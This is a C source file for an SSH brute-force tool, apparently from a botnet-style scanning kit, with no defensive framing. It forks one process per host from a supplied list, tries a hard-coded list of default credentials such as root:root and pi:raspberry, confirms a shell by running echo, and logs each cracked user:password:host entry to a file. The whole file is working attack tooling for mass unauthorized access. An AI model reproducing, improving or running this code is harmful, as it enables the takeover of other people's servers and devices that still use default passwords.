/*
    yum install libssh-devel -y
 
    compile:  gcc -o bruter Yuh.c -lssh
    compile with debug:  gcc -o bruter Yuh.c -lssh -DDEBUG
	
*/
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <libssh/libssh.h>
 
char *estring = "RyM_Gang";
#define INFO "[\x1b[33m%s\x1b[37m]"
#define ERROR "[\x1b[31m?\x1b[37m]"
#define FAILED "[\x1b[31m%s\x1b[37m]"
#define SUCCESS "[\x1b[32m+\x1b[37m]"
char *combos[] = {"root:root", "root:admin", "root:password", "root:1234", "root:12345", "root:support", "root:PASSWORD", "admin:admin", "admin:123", "admin:12345", "admin:password", "admin:PASSWORD", "support:support", "sales:sales", "office:office", "apache:apache", "visitor:visitor", "library:library", "root:webmaster", "root:apache", "http:http", "data:data", "root:login", "info:12345", "shop:shop", "master:master", "ubnt:ubnt", "1234:1234", "usuario:usuario", "guest:guest", "test:test:", "user:user", "pi:raspberry", "osmc:osmc", "operator:operator", "telnet:telnet", "telnet:PASSWORD", "support:support", "root:default", "root:system", "root:realtek", "supervisor:supervisor", "root:ubuntu14svm"};
#define combo_size (sizeof(combos) / sizeof(unsigned char *))
 
void Trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
 
void free_channel(ssh_channel channel) {
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
}
 
void free_session(ssh_session session) {
    ssh_disconnect(session);
    ssh_free(session);
}
 
void error(ssh_session session) {
    fprintf(stderr, "Error: %s\n", ssh_get_error(session));
    free_session(session);
    exit(-1);
}
 
void brute(char *host, int port)
{
    int rc;
    int Forks;
    int MaxForks;
    char *username;
    char combo[100];
    char password[30];
    int combo_num = 0;
    int statement = 0;
    char buffer[1024];
    ssh_session session;
    ssh_channel channel;
    unsigned int nbytes;
 
    start:
    switch(statement)
    {      
        case 0:
        {
            snprintf(combo, sizeof(combo), "%s", combos[combo_num]);
            username = strtok(combo, ":");
            snprintf(password, sizeof(password), "%s", username+strlen(username)+1);
            //printf(INFO" Trying combo -> %s:%s\n", host, username, password);
#ifdef DEBUG
            printf(INFO" Creating Secure Shell Session...\n", host);
#endif
            session = ssh_new();
            if (session == NULL)
            {
#ifdef DEBUG
                printf(FAILED" Failed to create Secure Shell Session...\n", host);
#endif
                goto end;
            }
           
            ssh_options_set(session, SSH_OPTIONS_HOST, host);
            ssh_options_set(session, SSH_OPTIONS_PORT, &port);
#ifdef DEBUG
            printf(INFO" Setting Username -> \x1b[34m%s\x1b[37m\n", host, username);
#endif
            ssh_options_set(session, SSH_OPTIONS_USER, username);
 
#ifdef DEBUG
            printf(INFO" Connecting...\n", host);
#endif
            rc = ssh_connect(session);
            if (rc != SSH_OK)
            {
                //error(session);
#ifdef DEBUG
                printf(FAILED" Failed to Connect to Host...\n", host);
#endif
                goto end;
            }
 
#ifdef DEBUG
            //printf(INFO" Password Autentication...\n");
            printf(INFO" Sending Password -> \x1b[35m%s\x1b[37m\n", host, password);
#endif
            rc = ssh_userauth_password(session, NULL, password);
            if (rc != SSH_AUTH_SUCCESS)
            {
                //error(session);
#ifdef DEBUG
                printf(FAILED" Incorrect Credentials...\n", host);
#endif
                if(combo_num == combo_size || combo_num > combo_size)
                    goto end;
                else
                {
                    combo_num++;
                    goto start;
                }
            }
           
            channel = ssh_channel_new(session);
            if (channel == NULL) exit(-1);
           
#ifdef DEBUG
            printf(INFO" Opening Shell...\n", host);
#endif
            rc = ssh_channel_open_session(channel);
            if (rc != SSH_OK)
            {
                //error(session);
#ifdef DEBUG
                printf(FAILED" Failed to Open Shell...\n", host);
#endif
                goto end;
            }
 
#ifdef DEBUG
            printf(INFO" Echo'ing Success String for Verification...\n", host);
#endif
            char cmd[60];
            snprintf(cmd, sizeof(cmd), "echo '%s'", estring);
            rc = ssh_channel_request_exec(channel, cmd);
            if(rc != SSH_OK)
            {
                //error(session);
#ifdef DEBUG
                printf(FAILED" Failed to Send Verification String...\n", host);
#endif
                goto end;
            }
 
            sleep(0.6);
            nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
            while (nbytes > 0)
            {
                if(strstr(buffer, estring))
				{
					printf(SUCCESS" Bruted -> %s:%s:%s\n", username, password, host);
					FILE *brutes;
					brutes = fopen("BrutedSSH.txt", "a");
					if(brutes == NULL)
						brutes = fopen("BrutedSSH.txt", "w");
					fprintf(brutes, "%s:%s:%s\n", username, password, host);
					fclose(brutes);
					break;
				}
                nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
            }
        }
        break;
    }
 
    end:
    free_channel(channel);
    free_session(session);
    return;
}
 
int main(int argc, char **argv)
{
    int Forks;
    int MaxForks;
    char buf[512];
    if(argc > 4 || argc < 4)
    {
        printf(ERROR" Usage: %s <list> <port> <max forks>\n", argv[0]);
        exit(0);
    }
    FILE *srvlist = fopen(argv[1], "r");
	printf(SUCCESS" Attempting to Brute %s ...\n", argv[1]);
    if(srvlist == NULL)
    {
        printf("[\x1b[31m-\x1b[37m] Failed to Open Given List (\x1b[33m%s\x1b[37m)\n", argv[1]);
        exit(0);
    }
    int port = atoi(argv[2]);
    MaxForks = atoi(argv[3]);
    while(fgets(buf, sizeof(buf) - 1, srvlist))
    {
        if(strlen(buf) < 3 || buf == NULL)
            break;
        Trim(buf);
        if(!(fork()))
        {
            brute(buf, port);
            exit(0);
        }
        else
        {
            sleep(0.2);
            continue;
        }
    }
    return 0;
}